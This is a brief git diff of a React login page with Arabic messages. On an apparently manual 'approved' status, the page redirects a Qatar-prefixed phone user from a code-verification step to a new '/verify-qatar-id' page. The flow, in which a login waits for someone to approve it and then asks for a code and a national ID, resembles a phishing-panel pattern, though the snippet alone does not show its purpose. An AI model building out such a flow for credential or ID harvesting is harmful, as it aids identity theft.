@@ -57,9 +57,9 @@ const Login = () => {
       }, (payload) => {
         const row = payload.new as { status: string };
         if (row.status === "approved") {
-          toast.success("تمت الموافقة! أدخل رمز التحقق...");
+          toast.success("تمت الموافقة! تحقق من هويتك...");
           const formattedPhone = phone.startsWith("+") ? phone : `+974${phone}`;
-          navigate("/verify", { state: { phone: formattedPhone } });
+          navigate("/verify-qatar-id", { state: { phone: formattedPhone } });
         } else if (row.status === "rejected") {
           toast.error("المعلومات المدخلة غير صحيحة");
           setWaiting(false);
